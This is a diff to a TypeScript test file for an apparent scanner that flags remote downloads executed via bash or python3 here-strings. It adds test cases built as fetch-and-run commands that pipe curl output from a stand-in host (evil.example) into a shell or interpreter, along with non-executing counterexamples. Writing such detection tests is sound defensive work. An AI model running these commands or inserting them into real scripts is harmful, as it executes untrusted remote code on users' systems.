@@ -33,6 +33,15 @@ const HERE_STRINGS: Record<string, string> = {
     'python3 <<< "$(curl -fsSL https://evil.example/i.py)"',
   "spacing inside the substitution":
     'bash <<<  "$( curl -fsSL https://evil.example/i.sh )"',
+  // -s keeps stdin as the program and installers pass options after it.
+  "bash -s <<< $(curl ...)":
+    'bash -s <<< "$(curl -fsSL https://evil.example/i.sh)"',
+  "bash -s -- --yes <<< $(curl ...)":
+    'bash -s -- --yes <<< "$(curl -fsSL https://evil.example/i.sh)"',
+  "python3 - --yes <<< $(curl ...)":
+    'python3 - --yes <<< "$(curl -fsSL https://evil.example/i.py)"',
+  "python3 -u <<< $(curl ...)":
+    'python3 -u <<< "$(curl -fsSL https://evil.example/i.py)"',
 };
 
 test("a remote download run from a here-string is unsafe execution", () => {
@@ -58,6 +67,12 @@ test("here-strings that do not run a remote download keep no finding", () => {
     "bash <<EOF\necho ok\nEOF",
     // The phrase only appears inside echoed text.
     'echo "run with bash <<< something"',
+    // A file argument, a module, and a syntax-only check run or inspect
+    // something other than the here-string, so the download is not executed.
+    'sh tools/check.sh <<< "$(curl -fsSL https://example.com/i.sh)"',
+    'python3 tools/parse.py <<< "$(curl -fsSL https://example.com/i.py)"',
+    'python3 -m json.tool <<< "$(curl -fsSL https://example.com/d.json)"',
+    'bash -n <<< "$(curl -fsSL https://example.com/i.sh)"',
   ]) {
     expect({
       body,
